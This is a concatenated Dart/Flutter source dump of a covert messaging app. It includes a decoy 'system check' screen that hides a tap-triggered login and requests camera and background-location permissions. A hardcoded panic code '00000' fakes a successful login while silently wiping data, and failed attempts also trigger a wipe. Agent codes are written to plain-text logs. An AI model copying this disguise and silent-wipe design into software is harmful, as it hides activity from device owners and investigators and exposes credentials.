                      content: Text("خدمة إرسال الرسائل غير متاحة.",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.orangeAccent,
                    ));
                  }
                  return;
                }

                // عرض مؤشر الإرسال
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Row(
                      children: [
                        SizedBox(
                          width: 20, 
                          height: 20, 
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: Colors.white,
                          )
                        ),
                        const SizedBox(width: 12),
                        Text("جاري إرسال الرسالة...", style: GoogleFonts.cairo()),
                      ],
                    ),
                    duration: const Duration(seconds: 1),
                    backgroundColor: theme.primaryColor,
                  ));
                }

                final newMessage = ChatMessage(
                  id: "", 
                  senderId: currentAgentCode,
                  text: text,
                  messageType: MessageType.text,
                  timestamp:
                      DateTime.now(), 
                  isSentByCurrentUser:
                      true, 
                );
                try {
                  await apiService.sendMessage(widget.conversationId, newMessage);
                  logger.info("ChatScreen:onSendPressed",
                      "Sent text msg to ${widget.conversationId}");
                } catch (e, stackTrace) {
                  logger.error("ChatScreen:onSendPressed",
                      "Failed to send text msg", e, stackTrace);
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("فشل إرسال الرسالة، يرجى المحاولة مرة أخرى",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.redAccent,
                    ));
                  }
                }
              } else {
                logger.info("ChatScreen:onSendPressed",
                    "Attempted to send empty text message.");
              }
            },
            onAttachmentPressed: () async {
              final apiService = ref.read(apiServiceProvider);
              if (apiService == null) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "ApiService is null. Cannot send attachment.");
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال المرفقات غير متاحة",
                          style: GoogleFonts.cairo())));
                }
                return;
              }
              try {
                FilePickerResult? result = await FilePicker.platform.pickFiles(
                  type: FileType.any, 
                  withData: true, // Ensure file bytes are loaded for MIME type detection and upload
                );
                if (result != null && result.files.isNotEmpty) {
                  PlatformFile file = result.files.first;
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Picked file: ${file.name}, size: ${file.size}");

                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Row(
                            children: [
                              SizedBox(
                                width: 20, 
                                height: 20, 
                                child: CircularProgressIndicator(
                                  strokeWidth: 2, 
                                  color: Colors.white
                                )
                              ),
                              const SizedBox(width: 12),
                              Text("جارٍ رفع الملف: ${file.name}...",
                                  style: GoogleFonts.cairo()),
                            ],
                          ),
                          duration: const Duration(seconds: 15),
                          backgroundColor: theme.primaryColor,
                      ),
                    );
                  }

                  String? downloadUrl = await apiService.uploadFileToStorage(file, widget.conversationId);
                  
                  if (!context.mounted) return; // Check mounted status after async operation

                  // إغلاق SnackBar الرفع
                  ScaffoldMessenger.of(context).hideCurrentSnackBar();

                  if (downloadUrl == null) {
                     logger.error("ChatScreen:onAttachmentPressed", "Upload failed for ${file.name}");
                     ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                            content: Text("فشل رفع الملف: ${file.name}",
                                style: GoogleFonts.cairo()),
                            backgroundColor: Colors.redAccent,
                        ),
                      );
                    return;
                  }
                  
                  logger.info("ChatScreen:onAttachmentPressed", "File ${file.name} uploaded. URL: $downloadUrl");

                  final newFileMessage = ChatMessage(
                    id: "",
                    senderId: currentAgentCode,
                    text: null, 
                    fileName: file.name,
                    fileUrl: downloadUrl, 
                    fileSize: file.size,
                    messageType: _determineMessageTypeFromFile(file),
                    timestamp: DateTime.now(),
                    isSentByCurrentUser: true,
                  );
                  await apiService.sendMessage(widget.conversationId, newFileMessage);
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Sent file message: ${file.name}");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Text("تم إرسال الملف: ${file.name}",
                              style: GoogleFonts.cairo())),
                    );
                  }
                } else {
                  logger.info("ChatScreen:onAttachmentPressed",
                      "File picking cancelled or no file selected.");
                }
              } catch (e, stackTrace) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "Error picking or sending file", e, stackTrace);
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text("حدث خطأ أثناء معالجة الملف، يرجى المحاولة مرة أخرى",
                        style: GoogleFonts.cairo()),
                    backgroundColor: Colors.redAccent,
                  ));
                }
              }
            },
          ),
        ],
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_service.dart
// ----------------------------------------------------------------------

// import 'package:flutter_riverpod/flutter_riverpod.dart';
// import 'package:uuid/uuid.dart';

// import '../../data/models/chat/chat_conversation.dart';
// import '../../data/models/chat/chat_message.dart';

// class ChatService {
//   final List<ChatConversation> _conversations = [];
//   final Map<String, List<ChatMessage>> _messages = {};
//   final Uuid _uuid = const Uuid();

//   // Get all chat conversations
//   List<ChatConversation> getConversations() {
//     return _conversations;
//   }

//   // Get messages for a specific conversation
//   List<ChatMessage> getMessages(String conversationId) {
//     return _messages[conversationId] ?? [];
//   }

//   // Add a new message to a conversation
//   void addMessage(String conversationId, ChatMessage message) {
//     if (_messages.containsKey(conversationId)) {
//       _messages[conversationId]!.add(message);
//     } else {
//       _messages[conversationId] = [message];
//     }
//   }

//   // Create a new conversation
//   ChatConversation createConversation(String userId, String userName) {
//     final newConversation = ChatConversation(
//       id: _uuid.v4(),
//       userName: userName,
//       lastMessage: '', // Initialize with empty last message
//       timestamp: DateTime.now(),
//     );
//     _conversations.add(newConversation);
//     return newConversation;
//   }
// }

// final chatServiceProvider = Provider((ref) => ChatService());



// ------------------------------ نهاية الملف: chat_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: auth_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\services\auth_service.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/services/auth_service.dart
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'dart:io' if (dart.library.html) 'dart:html' show Platform;

import '../../../core/logging/logger_service.dart';
import '../../../core/security/secure_storage_service.dart';

/// خدمة المصادقة المخصصة للتعامل مع رموز الوكلاء
class AuthService {
  final FirebaseFirestore _firestore;
  final LoggerService _logger;
  final SecureStorageService _secureStorage;

  AuthService(this._firestore, this._logger, this._secureStorage);

  /// التحقق من صحة رمز الوكيل مقابل Firestore
  Future<bool> validateAgentCode(String agentCode) async {
    if (agentCode.isEmpty) {
      _logger.warn("AuthService:validateAgentCode", "محاولة التحقق من رمز وكيل فارغ.");
      return false;
    }
    
    _logger.info("AuthService:validateAgentCode", "التحقق من رمز الوكيل: $agentCode مقابل 'agent_identities'");
    
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCode)
          .get();

      if (doc.exists) {
        _logger.info("AuthService:validateAgentCode", "رمز الوكيل '$agentCode' صالح (المستند موجود).");
        return true;
      } else {
        _logger.warn("AuthService:validateAgentCode", "رمز الوكيل '$agentCode' غير صالح (المستند غير موجود).");
        return false;
      }
    } catch (e, s) {
      _logger.error(
          "AuthService:validateAgentCode",
          "حدث خطأ أثناء التحقق من رمز الوكيل '$agentCode'",
          e,
          s);
      return false;
    }
  }

  /// الحصول على معرف الجهاز
  Future<String?> getDeviceId() async {
    final deviceInfo = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        return androidInfo.id;
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        return iosInfo.identifierForVendor;
      }
    } catch (e, s) {
      _logger.error("AuthService:getDeviceId", "فشل في الحصول على معرف الجهاز", e, s);
    }
    return null;
  }

  /// التحقق من رمز الوكيل وربط الجهاز إذا لزم الأمر
  Future<AuthResult> authenticateAgent(String agentCode) async {
    if (agentCode.isEmpty) {
      return AuthResult(
        success: false, 
        message: "الرجاء إدخال الرمز التعريفي",
        errorType: AuthErrorType.emptyCode
      );
    }

    // رقم الهلع - يقوم بإرجاع نجاح مع علامة الهلع
    if (agentCode == "00000") {
      _logger.warn("AuthService:authenticateAgent", "تم إدخال رمز الهلع '00000'! بدء التدمير الذاتي الصامت.");
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح",
        isPanicCode: true
      );
    }

    // التحقق من صحة الرمز
    final isValidCode = await validateAgentCode(agentCode);
    if (!isValidCode) {
      return AuthResult(
        success: false,
        message: "رمز التعريف غير صحيح. يرجى المحاولة مرة أخرى.",
        errorType: AuthErrorType.invalidCode
      );
    }

    // الحصول على معرف الجهاز
    final deviceId = await getDeviceId();
    if (deviceId == null) {
      _logger.error("AuthService:authenticateAgent", "فشل في الحصول على معرف الجهاز. إحباط تسجيل الدخول.");
      return AuthResult(
        success: false,
        message: "فشل في تحديد هوية الجهاز. لا يمكن المتابعة.",
        errorType: AuthErrorType.deviceIdError
      );
    }

    // الحصول على بيانات الوكيل
    final agentDocRef = _firestore.collection("agent_identities").doc(agentCode);
    final agentDocSnapshot = await agentDocRef.get();

    if (!agentDocSnapshot.exists) {
      _logger.error("AuthService:authenticateAgent", "رمز الوكيل $agentCode صالح ولكن المستند غير موجود. تناقض حرج.");
      return AuthResult(
        success: false,
        message: "خطأ في بيانات العميل.",
        errorType: AuthErrorType.dataInconsistency
      );
    }

    final agentData = agentDocSnapshot.data()!;
    final storedDeviceId = agentData["deviceId"] as String?;
    final isDeviceBindingRequired = agentData["deviceBindingRequired"] as bool? ?? true;
    final bool needsAdminApprovalForNewDevice = agentData["needsAdminApprovalForNewDevice"] as bool? ?? false;

    // التحقق من ربط الجهاز
    if (!isDeviceBindingRequired) {
      _logger.info("AuthService:authenticateAgent", "ربط الجهاز غير مطلوب لـ $agentCode.");
      // تخزين رمز الوكيل في التخزين الآمن
      await _secureStorage.writeAgentCode(agentCode);
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح"
      );
    } else if (storedDeviceId == null) {
      if (needsAdminApprovalForNewDevice) {
        _logger.info("AuthService:authenticateAgent", "أول تسجيل دخول لـ $agentCode على الجهاز $deviceId. مطلوب موافقة المسؤول.");
        return AuthResult(
          success: false,
          message: "هذا الجهاز جديد لهذا الرمز. يرجى انتظار موافقة المسؤول أو مراجعته.",
          errorType: AuthErrorType.needsAdminApproval
        );
      } else {
        _logger.info("AuthService:authenticateAgent", "أول تسجيل دخول لـ $agentCode على الجهاز $deviceId. ربط الجهاز تلقائيًا.");
        await agentDocRef.update({
          "deviceId": deviceId,
          "lastLoginAt": FieldValue.serverTimestamp(),
          "lastLoginDeviceId": deviceId
        });
        // تخزين رمز الوكيل في التخزين الآمن
        await _secureStorage.writeAgentCode(agentCode);
        return AuthResult(
          success: true,
          message: "تم التحقق بنجاح وربط الجهاز"
        );
      }
    } else if (storedDeviceId == deviceId) {
      _logger.info("AuthService:authenticateAgent", "تطابق معرف الجهاز لـ $agentCode: $deviceId");
      await agentDocRef.update({
        "lastLoginAt": FieldValue.serverTimestamp(),
        "lastLoginDeviceId": deviceId
      });
      // تخزين رمز الوكيل في التخزين الآمن
      await _secureStorage.writeAgentCode(agentCode);
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح"
      );
    } else {
      _logger.warn("AuthService:authenticateAgent", "عدم تطابق معرف الجهاز لـ $agentCode. المتوقع: $storedDeviceId، الحالي: $deviceId");
      return AuthResult(
        success: false,
        message: "هذا الجهاز غير مصرح له باستخدام هذا الرمز.",
        errorType: AuthErrorType.deviceMismatch
      );
    }
  }

  /// تسجيل الخروج وحذف رمز الوكيل من التخزين الآمن
  Future<void> logout() async {
    await _secureStorage.deleteAgentCode();
    _logger.info("AuthService:logout", "تم تسجيل الخروج وحذف رمز الوكيل من التخزين الآمن");
  }

  /// التحقق مما إذا كان المستخدم مسجل الدخول
  Future<bool> isLoggedIn() async {
    final agentCode = await _secureStorage.readAgentCode();
    return agentCode != null && agentCode.isNotEmpty;
  }

  /// الحصول على رمز الوكيل الحالي
  Future<String?> getCurrentAgentCode() async {
    return await _secureStorage.readAgentCode();
  }
}

/// نتيجة عملية المصادقة
class AuthResult {
  final bool success;
  final String message;
  final AuthErrorType? errorType;
  final bool isPanicCode;

  AuthResult({
    required this.success,
    required this.message,
    this.errorType,
    this.isPanicCode = false
  });
}

/// أنواع أخطاء المصادقة
enum AuthErrorType {
  emptyCode,
  invalidCode,
  deviceIdError,
  dataInconsistency,
  needsAdminApproval,
  deviceMismatch
}

/// مزود خدمة المصادقة
final authServiceProvider = Provider<AuthService>((ref) {
  final firestore = FirebaseFirestore.instance;
  final logger = ref.watch(loggerServiceProvider);
  final secureStorage = ref.watch(secureStorageServiceProvider);
  return AuthService(firestore, logger, secureStorage);
});

/// مزود خدمة LoggerService
final loggerServiceProvider = Provider<LoggerService>((ref) {
  return LoggerService("AuthService");
});



// ------------------------------ نهاية الملف: auth_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen.dart
// ----------------------------------------------------------------------

import "dart:async";

import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:permission_handler/permission_handler.dart";

import "../../app.dart";
import "../../core/logging/logger_provider.dart";
import "decoy_screen_controller.dart";

class DecoyScreen extends ConsumerStatefulWidget {
  final bool isPostDestruct;
  const DecoyScreen({super.key, this.isPostDestruct = false});

  @override
  ConsumerState<DecoyScreen> createState() => _DecoyScreenState();
}

class _DecoyScreenState extends ConsumerState<DecoyScreen> {
  bool _permissionsRequested = false;

  @override
  void initState() {
    super.initState();
    // Request permissions after widget is built
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _requestPermissions();
    });
  }

  Future<void> _requestPermissions() async {
    if (_permissionsRequested) return;

    final logger = ref.read(appLoggerProvider);
    logger.info("DecoyScreen", "Requesting required permissions");

    // List of required permissions from AndroidManifest.xml
    final permissions = [
      Permission.camera,
      Permission.location,
      Permission.locationWhenInUse,
      Permission.storage,
    ];

    // Request each permission
    for (var permission in permissions) {
      final status = await permission.status;

      if (status.isDenied) {
        logger.info("DecoyScreen", "Requesting permission: $permission");
        final result = await permission.request();

        logger.info("DecoyScreen", "Permission $permission result: $result");
      } else {
        logger.info("DecoyScreen", "Permission $permission status: $status");
      }
    }

    // Check if background location is needed (only request if other location permissions granted)
    if (await Permission.locationWhenInUse.isGranted) {
      final backgroundStatus = await Permission.locationAlways.status;
      if (backgroundStatus.isDenied) {
        logger.info("DecoyScreen", "Requesting background location permission");
        final result = await Permission.locationAlways.request();
        logger.info(
            "DecoyScreen", "Background location permission result: $result");
      }
    }

    setState(() {
      _permissionsRequested = true;
    });
  }

  @override
  Widget build(BuildContext context) {
    final controller = ref.watch(decoyScreenControllerProvider.notifier);
    final state = ref.watch(decoyScreenControllerProvider);

    // عرض شاشة القفل إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.lockoutEndTime != null) {
      return _buildLockoutScreen(context, controller.getRemainingLockoutTime());
    }

    // عرض شاشة ما بعد التدمير
    if (state.isPostDestruct || widget.isPostDestruct) {
      return _buildPostDestructScreen(context);
    }

    // عرض الشاشة الرئيسية
    return GestureDetector(
      onTap: () {
        controller.handleTap();
        if (controller.shouldShowPasswordDialog()) {
          _showPasswordDialog(context, ref);
        }
      },
      child: _buildMainScreen(context, state),
    );
  }

  Widget _buildLockoutScreen(BuildContext context, String remainingTime) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "لا يمكنك تسجيل الدخول الآن",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 22,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
              const SizedBox(height: 15),
              Text(
                "يرجى المحاولة مرة أخرى بعد: $remainingTime",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 16,
                  fontWeight: FontWeight.w500,
                  color: Colors.grey[700],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildPostDestructScreen(BuildContext context) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "تم تفعيل وضع الأمان. النظام مقفل.",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildMainScreen(BuildContext context, DecoyScreenState state) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.shield_outlined,
                size: 80,
                color: state.systemCheckComplete
                    ? theme.primaryColor
                    : Colors.grey[600],
              ),
              const SizedBox(height: 30),
              Text(
                state.statusMessage,
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: state.systemCheckComplete
                      ? Colors.green[600]
                      : theme.textTheme.bodyLarge?.color,
                ),
              ),
              const SizedBox(height: 20),
              if (!state.systemCheckComplete)
                Column(
                  children: [
                    LinearProgressIndicator(
                      value: state.progressValue,
                      backgroundColor: Colors.grey[300],
                      valueColor:
                          AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      minHeight: 6,
                    ),
                    const SizedBox(height: 10),
                    Text(
                      "${(state.progressValue * 100).toInt()}%",
                      style: GoogleFonts.cairo(
                          fontSize: 12, color: Colors.grey[600]),
                    ),
                  ],
                ),
              if (!_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: Column(
                    children: [
                      CircularProgressIndicator(
                        valueColor:
                            AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      ),
                      const SizedBox(height: 10),
                      Text(
                        "جاري التحقق من الأذونات...",
                        style: GoogleFonts.cairo(
                            fontSize: 14, color: Colors.grey[600]),
                      ),
                    ],
                  ),
                ),
              if (_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.settings_applications),
                    label: Text("إدارة الأذونات", style: GoogleFonts.cairo()),
                    onPressed: () async {
                      await openAppSettings();
                    },
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  void _showPasswordDialog(BuildContext context, WidgetRef ref) {
    final TextEditingController passwordController = TextEditingController();
    final controller = ref.read(decoyScreenControllerProvider.notifier);
    final state = ref.read(decoyScreenControllerProvider);
    final logger = ref.read(appLoggerProvider);
    bool isLoading = false;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext dialogContext) {
        return StatefulBuilder(
          builder: (context, setDialogState) {
            return AlertDialog(
              backgroundColor:
                  Theme.of(dialogContext).brightness == Brightness.dark
                      ? const Color(0xFF1F1F1F)
                      : Colors.grey[50],
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(15)),
              title: Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  Text("الوصول المشفر",
                      style: GoogleFonts.cairo(
                          fontWeight: FontWeight.bold,
                          color:
                              Theme.of(dialogContext).colorScheme.onSurface)),
                  const SizedBox(width: 8),
                  Icon(Icons.security_outlined,
                      color: Theme.of(dialogContext).primaryColor),
                ],
              ),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text("يرجى إدخال رمز المصادقة المخصص للوصول إلى النظام.",
                      textAlign: TextAlign.right,
                      style: GoogleFonts.cairo(
                          fontSize: 14, color: Colors.grey[600])),
                  const SizedBox(height: 20),
                  TextField(
                    controller: passwordController,
                    keyboardType: TextInputType.text,
                    autofocus: true,
                    textAlign: TextAlign.center,
                    style: GoogleFonts.cairo(
                        fontSize: 22,
                        letterSpacing: 3,
                        fontWeight: FontWeight.bold,
                        color: Theme.of(dialogContext).colorScheme.onSurface),
                    decoration: InputDecoration(
                      hintText: "- - - - - -",
                      hintStyle: GoogleFonts.cairo(
                          color: Colors.grey[500], fontSize: 20),
                      border: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(color: Colors.grey[400]!),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(
                            color: Theme.of(dialogContext).primaryColor,
                            width: 2),
                      ),
                      filled: true,
                      fillColor:
                          Theme.of(dialogContext).brightness == Brightness.dark
                              ? Colors.black.withOpacity(0.1)
                              : Colors.white,
                    ),
                  ),
                  if (state.failedLoginAttempts > 0)
                    Padding(
                      padding: const EdgeInsets.only(top: 10.0),
                      child: Text(
                        "المحاولات الخاطئة: ${state.failedLoginAttempts}/5",
                        textAlign: TextAlign.center,
                        style: GoogleFonts.cairo(
                            fontSize: 12, color: Colors.orange.shade700),
                      ),
                    ),
                ],
              ),
              actionsAlignment: MainAxisAlignment.center,
              actionsPadding: const EdgeInsets.only(bottom: 20, top: 10),
              actions: <Widget>[
                ElevatedButton.icon(
                  icon: isLoading
                      ? Container(
                          width: 20,
                          height: 20,
                          padding: const EdgeInsets.all(2.0),
                          child: const CircularProgressIndicator(
                            color: Colors.white,
                            strokeWidth: 3,
                          ),
                        )
                      : const Icon(Icons.login_rounded, size: 20),
                  label: Text(isLoading ? "جاري التحقق..." : "تأكيد الوصول",
                      style: GoogleFonts.cairo(
                          fontSize: 15, fontWeight: FontWeight.w600)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Theme.of(dialogContext).primaryColor,
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 30, vertical: 12),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10)),
                    elevation: 3,
                  ),
                  onPressed: isLoading
                      ? null
                      : () async {
                          setDialogState(() {
                            isLoading = true;
                          });

                          final enteredAgentCode =
                              passwordController.text.trim();
                          final bool isDialogCtxMounted = dialogContext.mounted;
                          final bool isMainCtxMounted = context.mounted;

                          logger.info("DecoyPasswordDialog",
                              "محاولة تسجيل الدخول برمز الوكيل: $enteredAgentCode");

                          final authResult = await controller
                              .authenticateWithAgentCode(enteredAgentCode);

                          if (!isDialogCtxMounted || !isMainCtxMounted) {
                            return;
                          }

                          if (authResult.success) {
                            logger.info("DecoyPasswordDialog",
                                "تم التحقق بنجاح من رمز الوكيل: $enteredAgentCode");

                            if (authResult.isPanicCode) {
                              // رمز الهلع - سيتم التعامل معه في وحدة التحكم
                              Navigator.of(dialogContext).pop();
                              Navigator.of(context).pushReplacement(
                                MaterialPageRoute(
                                    builder: (_) => const TheConduitApp()),
                              );
                              return;
                            }

                            Navigator.of(dialogContext).pop();
                            Navigator.of(context).pushReplacement(
                              MaterialPageRoute(
                                  builder: (_) => const TheConduitApp()),
                            );
                          } else {
                            logger.warn("DecoyPasswordDialog",
                                "رمز وكيل غير صالح: $enteredAgentCode");

                            if (ref
                                    .read(decoyScreenControllerProvider)
                                    .failedLoginAttempts >=
                                5) {
                              Navigator.of(dialogContext).pop();
                            } else {
                              ScaffoldMessenger.of(dialogContext)
                                  .showSnackBar(SnackBar(
                                content: Text(authResult.message,
                                    textAlign: TextAlign.right,
                                    style: GoogleFonts.cairo()),
                                backgroundColor: Colors.red[700],
                              ));
                              setDialogState(() {
                                isLoading = false;
                              });
                            }
                          }
                        },
                ),
              ],
            );
          },
        );
      },
    );
  }
}



// ------------------------------ نهاية الملف: decoy_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen_controller.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen_controller.dart
// ----------------------------------------------------------------------

// lib/presentation/decoy_screen/decoy_screen_controller.dart
import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../core/logging/logger_provider.dart';
import '../../core/security/self_destruct_service.dart';
import '../chat/services/auth_service.dart';

class DecoyScreenController extends StateNotifier<DecoyScreenState> {
  final Ref _ref;
  final AuthService _authService;
  Timer? _progressTimer;
  Timer? _lockoutTimer;

  static const String _failedAttemptsKey = 'failed_login_attempts_conduit';
  static const String _lockoutEndTimeKey = 'lockout_end_time_conduit';
  static const int _maxFailedAttempts = 5;
  static const Duration _lockoutDuration = Duration(minutes: 30);

  DecoyScreenController(this._ref, this._authService)
      : super(DecoyScreenState.initial()) {
    _loadFailedAttempts();
    _loadLockoutTime();
    if (!state.isPostDestruct) {
      _startSystemCheckAnimation();
    }
  }

  void _startSystemCheckAnimation() {
    _progressTimer = Timer.periodic(const Duration(milliseconds: 150), (timer) {
      state = state.copyWith(
        progressValue: state.progressValue + 0.02,
      );

      if (state.progressValue >= 1.0) {
        state = state.copyWith(
          progressValue: 1.0,
          statusMessage: "فحص النظام الأساسي مكتمل.",
          systemCheckComplete: true,
        );
        timer.cancel();
      } else if (state.progressValue > 0.7) {
        state = state.copyWith(
          statusMessage: "التحقق من سلامة المكونات...",
        );
      } else if (state.progressValue > 0.4) {
        state = state.copyWith(
          statusMessage: "تحميل وحدات الأمان...",
        );
      }
    });
  }

  Future<void> _loadFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: prefs.getInt(_failedAttemptsKey) ?? 0,
    );

    // تحقق مما إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      _ref.read(appLoggerProvider).warn(
          "DecoyScreenInit",
          "Max failed attempts (${state.failedLoginAttempts}) detected on load. Triggering silent self-destruct.");
      _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsOnLoad");
    }
  }

  Future<void> _loadLockoutTime() async {
    final prefs = await SharedPreferences.getInstance();
    final lockoutTimeMs = prefs.getInt(_lockoutEndTimeKey);
    if (lockoutTimeMs != null) {
      final lockoutEndTime = DateTime.fromMillisecondsSinceEpoch(lockoutTimeMs);
      if (lockoutEndTime.isAfter(DateTime.now())) {
        state = state.copyWith(lockoutEndTime: lockoutEndTime);
        _startLockoutTimer();
      } else {
        // الوقت انتهى، يمكن إعادة تعيين المحاولات
        await prefs.remove(_lockoutEndTimeKey);
      }
    }
  }

  void _startLockoutTimer() {
    _lockoutTimer?.cancel();
    _lockoutTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (state.lockoutEndTime == null ||
          state.lockoutEndTime!.isBefore(DateTime.now())) {
        timer.cancel();
        state = state.copyWith(lockoutEndTime: null);
      } else {
        // تحديث الحالة لإعادة بناء الواجهة وتحديث العداد التنازلي
        state = state.copyWith();
      }
    });
  }

  Future<void> _incrementFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: state.failedLoginAttempts + 1,
    );
    await prefs.setInt(_failedAttemptsKey, state.failedLoginAttempts);
    _ref.read(appLoggerProvider).warn(
        "DecoyScreen", "Failed login attempt. Count: ${state.failedLoginAttempts}");

    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      // تدمير المحادثات بشكل صامت وإظهار رسالة القفل
      await _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsReached");

      // تعيين وقت انتهاء القفل
      final lockoutEndTime = DateTime.now().add(_lockoutDuration);
      await prefs.setInt(
          _lockoutEndTimeKey, lockoutEndTime.millisecondsSinceEpoch);

      state = state.copyWith(lockoutEndTime: lockoutEndTime);
      _startLockoutTimer();
    }
  }

  Future<void> _resetFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: 0,
      lockoutEndTime: null,
    );
    await prefs.setInt(_failedAttemptsKey, 0);
    await prefs.remove(_lockoutEndTimeKey);
    _lockoutTimer?.cancel();
    _ref.read(appLoggerProvider).info("DecoyScreen", "Failed login attempts reset.");
  }

  void handleTap() {
    if (state.isPostDestruct ||
        !state.systemCheckComplete ||
        state.lockoutEndTime != null) {
      return;
    }
    state = state.copyWith(tapCount: state.tapCount + 1);
  }

  bool shouldShowPasswordDialog() {
    if (state.tapCount >= 5) {
      state = state.copyWith(tapCount: 0);
      return true;
    }
    return false;
  }

  Future<AuthResult> authenticateWithAgentCode(String agentCode) async {
    final result = await _authService.authenticateAgent(agentCode);
    
    if (result.success) {
      await _resetFailedAttempts();
      if (result.isPanicCode) {
        await _triggerSelfDestruct(triggeredBy: "PanicCode00000");
      }
    } else {
      await _incrementFailedAttempts();
    }
    
    return result;
  }

  // تدمير البيانات بشكل صامت دون إظهار أي إشعارات للمستخدم
